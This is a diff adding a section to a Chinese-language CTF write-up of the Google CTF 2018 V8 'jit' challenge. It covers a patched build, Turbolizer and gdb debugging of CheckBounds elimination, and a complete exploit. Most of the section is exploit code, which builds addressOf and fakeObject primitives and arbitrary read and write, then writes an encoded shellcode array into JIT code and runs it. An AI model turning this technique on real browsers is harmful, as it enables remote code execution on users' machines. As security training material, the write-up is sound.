@@ -470,6 +470,281 @@ console.log("[+]back_store_addr: "+hex(back_store_addr));
 
 
 
+#### v6.4.388.38
+
+
+
+**环境搭建**
+
+[patch下载](https://github.com/no1rr/Browser/tree/master/Google_ctf_2018_jit/0001-v6.4.388.38.patch.patch)
+
+```bash
+git checkout 6.4.388.38 
+gclient sync 
+git apply ../../../google_ctf_2018_jit/0001-v6.4.388.38.patch.patch
+tools/dev/v8gen.py x64.debug
+# 允许优化checkbounds
+echo "v8_untrusted_code_mitigations = false" >> out.gn/x64.debug/args.gn
+ninja -C out.gn/x64.debug
+```
+
+
+
+**漏洞利用**
+
+先试下之前的poc
+
+```javascript
+var arr = [1.1, 2.2, 3.3, 4.4];//
+function f(x)
+{   arr = [1.1, 2.2, 3.3, 4.4];
+    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
+    t = t + 1 + 1;
+    t -= 9007199254740989;  
+    t -= 1;                 
+    t *= 2;                 
+    t -= 1;                 
+    arr[t] = 1.0864618449742194e-311;	//int2float(0x200);
+    console.log('arr[t]:',arr[t]);
+}
+f(1);
+%OptimizeFunctionOnNextCall(f);
+f(1);
+%SystemBreak();
+```
+
+![image-20220212150151517](https://s2.loli.net/2022/02/12/QKUijYm8lHnLyp9.png)
+
+发现无法越界读取，查看Turbolizer发现在SimplifiedLowing阶段CheckBounds没有被优化
+
+![image-20220212151010604](https://s2.loli.net/2022/02/12/QlDAtS2GqMXNC9c.png)
+
+又去看了源码发现有CheckBounds优化的代码
+
+![image-20220212151220504](https://s2.loli.net/2022/02/12/vm3WCAbEK1OwgRe.png)
+
+于是gdb下断点
+
+```bash
+pwndbg> b src/compiler/simplified-lowering.cc:2420
+```
+
+重新运行并两次`continue`后，查看`index_type->Min()`,`index_type->Max()`,`length_type->Min()`和`length_type->Max()`的值
+
+![image-20220212152502325](https://s2.loli.net/2022/02/12/9CHNAMyuzLkGvl2.png)
+
+可以看到`length_type->Min()`和`length_type->Max()`分别为0x0和0x3fffffe，即poc中数组arr的length字段为range(0,0x3fffffe)，但是正确的length应该是range(4,4)
+
+于是修改一下poc，去掉函数f外的arr数组的声明，改为在函数中声明
+
+```javascript
+//var arr = [1.1, 2.2, 3.3, 4.4];//
+function f(x)
+{   var arr = [1.1, 2.2, 3.3, 4.4];
+    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
+    t = t + 1 + 1;
+    t -= 9007199254740989;  
+    t -= 1;                 
+    t *= 2;                 
+    t -= 1;                 
+    //arr[t] = 1.0864618449742194e-311;	//int2float(0x200);
+    console.log('arr[t]:',arr[t]);
+}
+f(1);
+%OptimizeFunctionOnNextCall(f);
+f(1);
+%SystemBreak();
+```
+
+此时`length_type->Min()`和`length_type->Max()`都变为正常，CheckBounds也优化掉了
+
+![image-20220212153221862](https://s2.loli.net/2022/02/12/AusRyO4t7GIEqdg.png)
+
+![image-20220212153407588](https://s2.loli.net/2022/02/12/rmEnXvZJ8OLqF2j.png)
+
+
+
+接下来就是和之前类似的利用方法了
+
+**与之前exp不同的几个地方**
+
+1. `arr`数组在函数内部声明，在函数外无法直接调用，所以使用renturn返回arr数组
+2. 因为该版本不支持BigUint64Array，所以改用Uint32Array，格式转换感觉会麻烦些
+3. WebAssembly的rwx_page_addr不在wasmintance地址下方，改用`jit_func`，获取到的`code_addr`加上`0x60`才是`jit_func`开始执行的地方
+4. `addressOf`原语中使用到的`obj_arr`如果采用之前的声明方式（即四个数组元素都是`flaot_arr`），此时使用`addressOf`原语获取`big_jit_func`地址，v8会为`obj_arr`重新创建一个数组，原来的`obj_arr`数组就无法利用。所以在声明`obj_arr`时就把四个数组元素都设置成`big_jit_func`，这样v8就不会重新创建数组
+
+```javascript
+var buf = new ArrayBuffer(16);
+var float64 = new Float64Array(buf);
+//var bigUint64 = new BigUint64Array(buf);
+var Uint32 = new Uint32Array(buf);
+function hex(i){
+    return '0x' + i[1].toString(16).padStart(8, '0') +  i[0].toString(16).padStart(8, '0');
+}
+
+function f2i(f)
+{
+    float64[0] = f;
+    return [Uint32[0], Uint32[1]];
+}
+
+function i2f(i)
+{   
+    Uint32[0] = i[0];
+    Uint32[1] = i[1];
+    return float64[0];
+}
+
+function big_jit_func(p,q){
+    let tmp = {xx:1.3,yy:2.2,zz:3.3};
+    let a = [1.1,2.2,3.3];
+    a.push(p.x);
+    a.push(p.y);
+    a.push(p.z);
+
+    if(p.x > q.x || p.y > p.y){
+        return p.z;
+    }else if(p.x == q.x || p.y == q.y){
+        return q.z;
+    }
+
+    if(p.x * p.y > 3.3) tmp.xx = 1000;
+    if(p.y * p.z > 4.4) tmp.yy = 2001.1;
+    if(p.z * q.z > 5.5) tmp.zz = 1.1;
+
+    if(q.z * q.y > 10) a.push(q.z);
+    if(p.z * q.y > 30.1) a.push(p.z);
+    if(q.x * p.x < 100) a.shift();
+
+    p.x = p.y * q.x + a.pop() + a.shift();
+    p.y = p.z / q.y + a.pop() + a.shift();
+    p.z = p.x / q.z + a.pop() + a.shift();
+    
+    q.x = tmp.xx + q.z;
+    q.y = tmp.zz + q.x;
+    q.z = tmp.yy + q.y;
+
+    return p.z + q.z + tmp.zz;
+}
+
+
+for (var i = 0; i < 0x10000; ++i) {
+    big_jit_func({x:1.2,y:1.1,z:1.3},{x:1.3,y:1.4,z:5.1});
+}
+
+
+function f(x)
+{   var arr = [1.1, 2.2, 3.3, 4.4];
+    var obj_arr = [big_jit_func, big_jit_func, big_jit_func, big_jit_func];
+    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
+    t = t + 1 + 1;          //range(9007199254740991,9007199254740992)|range(9007199254740991,9007199254740994)
+    t -= 9007199254740989;  //range(2,3)|range(2,5)
+    t -= 1;                 //range(1,2)|range(1,4)
+    t *= 2;                 //range(2,4)|range(2,8)
+    t -= 1;                 //range(1,3)|range(1,7)
+    arr[t] = 1.0864618449742194e-311;
+    return [arr, obj_arr];
+}
+
+
+
+f(1);
+//%OptimizeFunctionOnNextCall(f);
+for(let i=0; i<0x10000; i++) {
+    f(1);
+}
+arr = f(1);
+var float_arr = arr[0];
+var obj_arr = arr[1];
+console.log('-------------------');
+// %DebugPrint(float_arr);
+// %DebugPrint(obj_arr);
+
+var float_arr_map_idx =4;
+var obj_arr_map_idx = 14;
+var float_arr_map = float_arr[float_arr_map_idx];
+var obj_arr_map = float_arr[obj_arr_map_idx];
+console.log('[*]float_arr_map:',hex(f2i(float_arr_map)));
+console.log('[*]obj_arr_map:',hex(f2i(obj_arr_map)));
+
+function addressOf(obj2leak) {
+    obj_arr[0] = obj2leak;
+    float_arr[obj_arr_map_idx] = float_arr_map;
+    let re = obj_arr[0];    //leaked_addr
+    float_arr[obj_arr_map_idx] = obj_arr_map;    
+    return f2i(re);
+}
+
+function fakeObject(addr2fake) {
+    float_arr[obj_arr_map_idx] = float_arr_map;
+    obj_arr[0] = i2f(addr2fake);
+    float_arr[obj_arr_map_idx] = obj_arr_map;
+    return obj_arr[0];
+}
+
+
+var fake_arr_to_obj = [
+    float_arr_map,  //map
+    i2f([0,0]),    //properties
+    i2f([0xdeade,0xdeaddead]),   //elements
+    i2f([0x0,0x100]),     //length
+    1.1,2.2
+].slice(0);
+
+
+var fake_obj_addr = addressOf(fake_arr_to_obj);
+console.log('[*]fake_obj_addr:',hex(f2i((fake_obj))));
+fake_obj_addr[0] -= 0x30;
+var fake_obj = fakeObject(fake_obj_addr);
+// %DebugPrint(fake_obj);
+
+function arb_read(read_addr) {
+    read_addr[0]-= 0x10;
+    fake_arr_to_obj[2] = i2f(read_addr);
+    var leaked_data = fake_obj[0];
+    return f2i(leaked_data);
+}
+
+function arb_write(write_addr, value) {
+    // /console.log('writeaddr:',hex(write_addr));
+    write_addr[0] -= 0x10;
+    fake_arr_to_obj[2] = i2f(write_addr);
+    //write_addr[0] += 0x10;
+    fake_obj[0] = i2f(value);
+} 
+
+let code_offset = 0x30;
+let jit_func_addr = addressOf(big_jit_func);
+//jit_func_addr[0] += 0x10;
+jit_func_addr[0] += code_offset;
+var code_addr = arb_read(jit_func_addr);
+let rwx_addr = code_addr;
+console.log('[*]jit_func_addr:',hex((jit_func_addr)));
+//%DebugPrint(fake_obj);
+console.log('[*]code_addr:',hex((code_addr)));
+//%DebugPrint(big_jit_func);
+//%SystemBreak();
+code_addr[0] += 0x60;
+
+const shellcode = [0x90,0x90,0x90,0x90,0x90,72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
+
+//let sc = new Uint32Array(rwx_addr);consol
+for(var i = 0;i < shellcode.length;i++) {
+
+    
+    arb_write(code_addr,[shellcode[i],shellcode[i]]);
+    //%DebugPrint(code_addr);
+    code_addr[0] = code_addr[0]+1+0x10;//arb_write中-=0x10
+    //%SystemBreak();
+}
+//%SystemBreak();
+big_jit_func({x:1.2,y:1.1,z:1.3},{x:1.3,y:1.4,z:5.1});
+
+//%SystemBreak();
+```
+
+
+
 #### 参考
 
 1. [浅析 V8-turboFan（下）](https://www.anquanke.com/post/id/229554)
